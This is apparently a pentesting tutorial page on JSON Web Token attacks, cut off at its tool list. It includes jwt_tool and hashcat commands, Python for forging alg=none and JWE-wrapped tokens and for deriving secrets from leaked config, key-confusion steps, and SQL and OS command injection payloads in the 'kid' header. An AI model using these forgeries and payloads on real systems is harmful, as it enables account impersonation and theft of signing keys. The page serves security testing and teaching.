_body: "# JWT Vulnerabilities (Json Web Tokens)\n\n{{#include ../banners/hacktricks-training.md}}\n\n**Part of this post is\
  \ based in the awesome post:** [**https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\\\
  \n**Author of the great tool to pentest JWTs** [**https://github.com/ticarpi/jwt_tool**](https://github.com/ticarpi/jwt_tool)\n\
  \n### **Quick Wins**\n\nRun [**jwt_tool**](https://github.com/ticarpi/jwt_tool) with mode `All Tests!` and wait for green\
  \ lines\n\n```bash\npython3 jwt_tool.py -M at \\\n    -t \"https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245\"\
  \ \\\n    -rh \"Authorization: Bearer eyJhbG...<JWT Token>\"\n```\n\nIf you are lucky the tool will find some case where\
  \ the web application is incorrectly checking the JWT:\n\n![](<../images/image (935).png>)\n\nThen, you can search the request\
  \ in your proxy or dump the used JWT for that request using jwt\\_ tool:\n\n```bash\npython3 jwt_tool.py -Q \"jwttool_706649b802c9f5e41052062a3787b291\"\
  \n```\n\nYou can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks\
  \ from Burp.\n\n### Practical JWT assessment workflow\n\n- **Scope the session control**: Pick a user-specific request (e.g.,\
  \ profile, billing). Remove cookies/headers one at a time until the request is rejected to isolate which token(s) actually\
  \ gate authorization.\n- **Locate JWTs in traffic**: They often sit in `Authorization: Bearer <JWT>`, but also appear in\
  \ custom headers or cookies. If Burp doesn’t highlight them, use Target → Site map → Engagement tools → Search with regex\
  \ patterns such as:\n  - `[= ]eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9._-]*`\n  - `eyJ[a-zA-Z0-9_-]+?\\.[a-zA-Z0-9_-]+?\\.[a-zA-Z0-9_-]+`\n\
  \  - `[= ]eyJ[A-Za-z0-9_\\\\/+-]*\\.[A-Za-z0-9._\\\\/+-]*`\n- **Decode and enumerate**: Use Burp **JWT Editor** or `python3\
  \ jwt_tool.py <JWT>` to read header/payload. Note `alg`, `exp`/token lifetime, and authn/authz-driving claims (`role`, `id`,\
  \ `username`, `email`, etc.).\n- **Signature enforcement sanity check**: Flip or delete a few bytes in the signature portion\
  \ and replay. Acceptance implies missing signature validation and you can directly tamper payload claims.\n- **Goal**: Modify\
  \ payload claims to escalate privileges; every attack below aims to get the server to accept a tampered payload by abusing\
  \ weak verification, weak secrets, or unsafe key selection.\n\n### Tamper data without modifying anything\n\nYou can just\
  \ tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your\
  \ username to \"admin\" for example.\n\n#### **Is the token checked?**\n\nTo check if a JWT's signature is being verified:\n\
  \n- An error message suggests ongoing verification; sensitive details in verbose errors should be reviewed.\n- A change\
  \ in the returned page also indicates verification.\n- No change suggests no verification; this is when to experiment with\
  \ tampering payload claims.\n\n### Origin\n\nIt's important to determine whether the token was generated server-side or\
  \ client-side by examining the proxy's request history.\n\n- Tokens first seen from the client side suggest the key might\
  \ be exposed to client-side code, necessitating further investigation.\n- Tokens originating server-side indicate a secure\
  \ process.\n\n### Duration\n\nCheck if the token lasts more than 24h... maybe it never expires. If there is a \"exp\" filed,\
  \ check if the server is correctly handling it.\n\n### Brute-force HMAC secret\n\n[**See this page.**](../generic-hacking/brute-force.md#jwt)\n\
  \nIf the header uses **HS256**, dump the token to a file and try offline cracking:\n\n```bash\npython3 jwt_tool.py <JWT>\
  \ -C -d wordlist.txt\nhashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule\n```\n\
  \nOnce the secret is recovered, load it as a symmetric key in Burp JWT Editor and re-sign modified claims.\n\n### Derive\
  \ JWT secrets from leaked config + DB data\n\nIf an arbitrary file read (or backup leak) exposes both **application encryption\
  \ material** and **user records**, you can sometimes recreate the JWT signing secret and forge session cookies without knowing\
  \ any plaintext passwords. Example pattern observed in workflow automation stacks:\n\n1. Leak the app key (e.g., `encryptionKey`)\
  \ from a config file.\n2. Leak the user table to obtain `email`, `password_hash`, and `user_id`.\n3. Derive the signing\
  \ secret from the key, then derive the per-user hash expected in the JWT payload:\n\n```python\njwt_secret = sha256(encryption_key[::2]).hexdigest()\
  \              # signing key\njwt_hash = b64encode(sha256(f\"{email}:{password_hash}\")).decode()[:10]\ntoken = jwt.encode({\"\
  id\": user_id, \"hash\": jwt_hash}, jwt_secret, \"HS256\")\n```\n\n4. Drop the signed token into the session cookie (e.g.,\
  \ `n8n-auth`) to impersonate the user/admin account even if the password hash is salted.\n\n### Modify the algorithm to\
  \ None\n\nSet the algorithm used as \"None\" and remove the signature part.\n\nUse the Burp extension call \"JSON Web Token\"\
  \ to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the \"JSON\
  \ Web Token\" tab you can modify the values of the token. You can also select to put the value of the \"Alg\" field to \"\
  None\").\n\n### JWE-wrapped PlainJWT / public-key auth bypass (pac4j-jwt CVE-2026-29000)\n\nSome stacks expect a **signed\
  \ inner JWT** wrapped inside an **encrypted JWE**. In vulnerable `pac4j-jwt` versions (before `4.5.9`, `5.7.9`, and `6.3.3`),\
  \ the authenticator decrypts the JWE, tries to parse the payload as a signed JWT, and only verifies the signature if that\
  \ conversion succeeds. If the decrypted payload is a **PlainJWT** (`alg=none`), `toSignedJWT()` returns `null` and the signature\
  \ verification path is skipped.\n\n- **Pre-reqs**:\n  - The application accepts **JWE bearer tokens**\n  - The server public\
  \ key is exposed (commonly via **JWKS** such as `/.well-known/jwks.json` or `/api/auth/jwks`)\n  - Authorization depends\
  \ on attacker-controlled claims such as `sub`, `role`, `groups`, or `scope`\n- **Impact**: forge an encrypted token for\
  \ any user/role using **only the public key**\n\nPractical checks:\n\n- Enumerate the frontend / API docs for clues such\
  \ as `RSA-OAEP-256`, `A128GCM`/`A256GCM`, `jwks`, or comments saying \"inner JWT is signed\".\n- Fetch the JWKS and import\
  \ the RSA key from `n`/`e`.\n- Build the inner token manually as `base64url(header) + \".\" + base64url(payload) + \".\"\
  ` so the signature is empty.\n- Encrypt that plaintext JWT as a JWE using the exposed public key and replay it as the bearer\
  \ token.\n\nMinimal PlainJWT construction:\n\n```python\nheader = {\"alg\": \"none\"}\nclaims = {\"sub\": \"admin\", \"\
  role\": \"ROLE_ADMIN\", \"iss\": \"target\"}\nb64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip(\"=\")\nplain\
  \ = (\n    f\"{b64(json.dumps(header, separators=(',', ':')).encode())}.\"\n    f\"{b64(json.dumps(claims, separators=(',',\
  \ ':')).encode())}.\"\n)\n```\n\nEncrypt it into a compact JWE with the RSA public key from JWKS:\n\n```python\nrsa_key\
  \ = jwk.JWK(**jwks[\"keys\"][0])\ntoken = jwe.JWE(\n    plaintext=plain.encode(),\n    protected=json.dumps({\"alg\": \"\
  RSA-OAEP-256\", \"enc\": \"A256GCM\"}),\n    recipient=rsa_key,\n)\nforged = token.serialize(compact=True)\n```\n\nNotes:\n\
  \n- If your JWT library refuses to emit `alg=none`, generate the compact token manually as shown above.\n- The `enc` value\
  \ must match one accepted by the target; frontend comments and legitimate tokens often disclose this.\n- In SPAs, check\
  \ whether the bearer token is stored in `sessionStorage`, `localStorage`, or a JS-accessible cookie; dropping the forged\
  \ token there is often enough to validate the bypass quickly.\n\n### Change the algorithm RS256(asymmetric) to HS256(symmetric)\
  \ (CVE-2016-5431/CVE-2016-10555)\n\nThe algorithm HS256 uses the secret key to sign and verify each message.\\\nThe algorithm\
  \ RS256 uses the private key to sign the message and uses the public key for authentication.\n\nIf you change the algorithm\
  \ from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify\
  \ the signature.\n\nThen, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve\
  \ the certificate of the web server executing this:\n\n```bash\nopenssl s_client -connect example.com:443 2>&1 < /dev/null\
  \ | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In\
  \ the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This\
  \ extension allows you to send the \"non\" algorithm attack also). It is also recommended to use the tool jwt_tool with\
  \ the option 2 as the previous Burp Extension does not always works well.\nopenssl x509 -pubkey -in certificatechain.pem\
  \ -noout > pubkey.pem\n```\n\nUsing Burp **JWT Editor**, import the RSA public key (from `/.well-known/jwks.json` or a PEM)\
  \ and run **Attack → HMAC Key Confusion Attack** to automate the HS256 re-sign attempt.\n\n### New public key inside the\
  \ header\n\nAn attacker embeds a new key in the header of the token and the server uses this new key to verify the signature\
  \ (CVE-2018-0114).\n\nThis can be done with the \"JSON Web Tokens\" Burp extension.\\\n(Send the request to the Repeater,\
  \ inside the JSON Web Token tab select \"CVE-2018-0114\" and send the request).\n\n### JWKS Spoofing\n\nThe instructions\
  \ detail a method to assess the security of JWT tokens, particularly those employing a \"jku\" header claim. This claim\
  \ should link to a JWKS (JSON Web Key Set) file that contains the public key necessary for the token's verification.\n\n\
  - **Assessing Tokens with \"jku\" Header**:\n  - Verify the \"jku\" claim's URL to ensure it leads to the appropriate JWKS\
  \ file.\n  - Modify the token's \"jku\" value to direct towards a controlled web service, allowing traffic observation.\n\
  - **Monitoring for HTTP Interaction**:\n  - Observing HTTP requests to your specified URL indicates the server's attempts\
  \ to fetch keys from your provided link.\n  - When employing `jwt_tool` for this process, it's crucial to update the `jwtconf.ini`\
  \ file with your personal JWKS location to facilitate the testing.\n- **Command for `jwt_tool`**:\n\n  - Execute the following\
  \ command to simulate the scenario with `jwt_tool`:\n\n    ```bash\n    python3 jwt_tool.py JWT_HERE -X s\n    ```\n\n###\
  \ Kid Issues Overview\n\nAn optional header claim known as `kid` is utilized for identifying a specific key, which becomes\
  \ particularly vital in environments where multiple keys exist for token signature verification. This claim assists in selecting\
  \ the appropriate key to verify a token's signature.\n\n#### Revealing Key through \"kid\"\n\nWhen the `kid` claim is present\
  \ in the header, it's advised to search the web directory for the corresponding file or its variations. For instance, if\
  \ `\"kid\":\"key/12345\"` is specified, the files _/key/12345_ and _/key/12345.pem_ should be searched for in the web root.\n\
  \n#### Path Traversal with \"kid\"\n\nThe `kid` claim might also be exploited to navigate through the file system, potentially\
  \ allowing the selection of an arbitrary file. It's feasible to test for connectivity or execute Server-Side Request Forgery\
  \ (SSRF) attacks by altering the `kid` value to target specific files or services. Tampering with the JWT to change the\
  \ `kid` value while retaining the original signature can be achieved using the `-T` flag in jwt_tool, as demonstrated below:\n\
  \n```bash\npython3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\n```\n\nBy targeting files with\
  \ predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file\
  \ in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password\
  \ for JWT generation.\n\nA practical pattern for brittle file-system key loading is to generate an HS256 key with JWK `k`\
  \ set to `AA==`, set `kid` to a traversal like `../../../../../../../dev/null`, and re-sign—some implementations treat the\
  \ empty file as a valid HMAC secret and will accept forged tokens.\n\n#### SQL Injection via \"kid\"\n\nIf the `kid` claim's\
  \ content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid`\
  \ payload. An example payload that uses SQL injection to alter the JWT signing process includes:\n\n`non-existent-index'\
  \ UNION SELECT 'ATTACKER';-- -`\n\nThis alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.\n\n\
  #### OS Injection through \"kid\"\n\nA scenario where the `kid` parameter specifies a file path used within a command execution\
  \ context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's\
  \ possible to expose private keys. An example payload for achieving RCE and key exposure is:\n\n`/root/res/keys/secret7.key;\
  \ cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`\n\n### x5u and jku\n\n#### jku\n\njku stands for **JWK Set URL**.\\\
  \nIf the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing\
  \ the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service\
  \ you can monitor traffic for.\n\nFirst you need to create a new certificate with new private & public keys\n\n```bash\n\
  openssl genrsa -out keypair.pem 2048\nopenssl rsa -in keypair.pem -pubout -out publickey.crt\nopenssl pkcs8 -topk8 -inform\
  \ PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key\n```\n\nThen you can use for example [**jwt.io**](https://jwt.io)\
  \ to create the new JWT with the **created public and private keys and pointing the parameter jku to the certificate created.**\
  \ In order to create a valid jku certificate you can download the original one anche change the needed parameters.\n\nYou\
  \ can obtain the parametes \"e\" and \"n\" from a public certificate using:\n\n```bash\nfrom Crypto.PublicKey import RSA\n\
  fp = open(\"publickey.crt\", \"r\")\nkey = RSA.importKey(fp.read())\nfp.close()\nprint(\"n:\", hex(key.n))\nprint(\"e:\"\
  , hex(key.e))\n```\n\nIf the verifier fetches key material remotely, embed a Burp Collaborator URL in `jku`/`x5u` using\
  \ **JWT Editor → Attack → Embed Collaborator payload**. Any callback confirms SSRF-style key retrieval; then host your own\
  \ JWKS/PEM at that URL and re-sign with your private key so the service validates attacker-minted tokens.\n\n#### x5u\n\n\
  X.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. The\
  \ first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous\
  \ one, thus completing the certificate chain. X.509 is defined in RFC 52807 . Transport security is required to transfer\
  \ the certificates.\n\nTry to **change this header to an URL under your control** and check if any request is received.\
  \ In that case you **could tamper the JWT**.\n\nTo forge a new token using a certificate controlled by you, you need to\
  \ create the certificate and extract the public and private keys:\n\n```bash\nopenssl req -x509 -nodes -days 365 -newkey\
  \ rsa:2048 -keyout attacker.key -out attacker.crt\nopenssl x509 -pubkey -noout -in attacker.crt > publicKey.pem\n```\n\n\
  Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys\
  \ and pointing the parameter x5u to the certificate .crt created.**\n\n![](<../images/image (956).png>)\n\nYou can also\
  \ abuse both of these vulns **for SSRFs**.\n\n#### x5c\n\nThis parameter may contain the **certificate in base64**:\n\n\
  ![](<../images/image (1119).png>)\n\nIf the attacker **generates a self-signed certificate** and creates a forged token\
  \ using the corresponding private key and replace the \"x5c\" parameter’s value with the newly generatedcertificate and\
  \ modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.\n\
  \n```bash\nopenssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt\nopenssl x509 -in attacker.crt\
  \ -text\n```\n\n### Embedded Public Key (CVE-2018-0114)\n\nIf the JWT has embedded a public key like in the following scenario:\n\
  \n![](<../images/image (624).png>)\n\nUsing the following nodejs script it's possible to generate a public key from that\
  \ data:\n\n```bash\nconst NodeRSA = require('node-rsa');\nconst fs = require('fs');\nn =\"​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8\"\
  ​;\ne = \"AQAB\";\nconst key = new NodeRSA();\nvar importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e,\
  \ 'base64'),}, 'components-public');\nconsole.log(importedKey.exportKey(\"public\"));\n```\n\nIt's possible to generate\
  \ a new private/public key, embeded the new public key inside the token and use it to generate a new signature:\n\n```bash\n\
  openssl genrsa -out keypair.pem 2048\nopenssl rsa -in keypair.pem -pubout -out publickey.crt\nopenssl pkcs8 -topk8 -inform\
  \ PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key\n```\n\nYou can obtain the \"n\" and \"e\" using this nodejs\
  \ script:\n\n```bash\nconst NodeRSA = require('node-rsa');\nconst fs = require('fs');\nkeyPair = fs.readFileSync(\"keypair.pem\"\
  );\nconst key = new NodeRSA(keyPair);\nconst publicComponents = key.exportKey('components-public');\nconsole.log('Parameter\
  \ n: ', publicComponents.n.toString(\"hex\"));\nconsole.log('Parameter e: ', publicComponents.e.toString(16));\n```\n\n\
  Finally, using the public and private key and the new \"n\" and \"e\" values you can use [jwt.io](https://jwt.io) to forge\
  \ a new valid JWT with any information.\n\n### ES256: Revealing the private key with same nonce\n\nIf some applications\
  \ use ES256 and use the same nonce to generate two jwts, the private key can be restored.\n\nHere is a example: [ECDSA:\
  \ Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5)\n\n### JTI\
  \ (JWT ID)\n\nThe JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can be used to prevent the token from\
  \ being replayed.\\\nHowever, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001\
  \ and 10001 are going to use the same ID. So if the backend is incrementig the ID on each request you could abuse this to\
  \ **replay a request** (needing to send 10000 request between each successful replay).\n\n### JWT Registered claims\n\n\n\
  {{#ref}}\nhttps://www.iana.org/assignments/jwt/jwt.xhtml#claims\n{{#endref}}\n\n### Other attacks\n\n**Cross-service Relay\
  \ Attacks**\n\nIt has been observed that some web applications rely on a trusted JWT service for the generation and management\
  \ of their tokens. Instances have been recorded where a token, generated for one client by the JWT service, was accepted\
  \ by another client of the same JWT service. If the issuance or renewal of a JWT via a third-party service is observed,\
  \ the possibility of signing up for an account on another client of that service using the same username/email should be\
  \ investigated. An attempt should then be made to replay the obtained token in a request to the target to see if it is accepted.\n\
  \n- A critical issue may be indicated by the acceptance of your token, potentially allowing the spoofing of any user's account.\
  \ However, it should be noted that permission for wider testing might be required if signing up on a third-party application,\
  \ as this could enter a legal grey area.\n\n**Expiry Check of Tokens**\n\nThe token's expiry is checked using the \"exp\"\
  \ Payload claim. Given that JWTs are often employed without session information, careful handling is required. In many instances,\
  \ capturing and replaying another user's JWT could enable impersonation of that user. The JWT RFC recommends mitigating\
  \ JWT replay attacks by utilizing the \"exp\" claim to set an expiry time for the token. Furthermore, the implementation\
  \ of relevant checks by the application to ensure the processing of this value and the rejection of expired tokens is crucial.\
  \ If the token includes an \"exp\" claim and testing time limits allow, storing the token and replaying it after the expiry\
  \ time has passed is advised. The content of the token, including timestamp parsing and expiry checking (timestamp in UTC),\
  \ can be read using the jwt_tool's -R flag.\n\n- A security risk may be present if the application still validates the token,\
  \ as it may imply that the token could never expire.\n\n### Tools\n\n- [jwt_tool](https://github.com/ticarpi/jwt_tool) –\
